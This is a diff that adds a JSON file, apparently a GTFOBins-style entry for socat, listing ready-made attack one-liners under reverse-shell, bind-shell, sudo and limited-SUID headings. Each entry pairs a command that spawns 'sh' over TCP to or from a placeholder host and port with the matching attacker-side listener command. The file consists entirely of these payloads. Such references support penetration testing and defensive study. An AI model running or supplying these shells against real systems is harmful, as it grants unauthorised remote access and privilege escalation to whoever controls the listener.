@@ -1,0 +1,28 @@
+{
+  "functions": {
+    "reverse-shell": [
+      {
+        "description": "Run 'socat file:`tty`,raw,echo=0 tcp-listen:[port]' on the attacker box to receive the shell.",
+        "code": "socat tcp-connect:[host]:[port] exec:sh,pty,stderr,setsid,sigint,sane\n"
+      }
+    ],
+    "bind-shell": [
+      {
+        "description": "Run 'socat FILE:`tty`,raw,echo=0 TCP:target.com:[port]' on the attacker box to connect to the shell.",
+        "code": "socat TCP-LISTEN:[port],reuseaddr,fork EXEC:sh,pty,stderr,setsid,sigint,sane\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "Run 'socat file:`tty`,raw,echo=0 tcp-listen:[port]' on the attacker box to receive the shell.",
+        "code": "sudo -E socat tcp-connect:[host]:[port] exec:sh,pty,stderr,setsid,sigint,sane\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "description": "Run 'socat file:`tty`,raw,echo=0 tcp-listen:[port]' on the attacker box to receive the shell.",
+        "code": "./socat tcp-connect:[host]:[port] exec:sh,pty,stderr,setsid,sigint,sane\n"
+      }
+    ]
+  }
+}
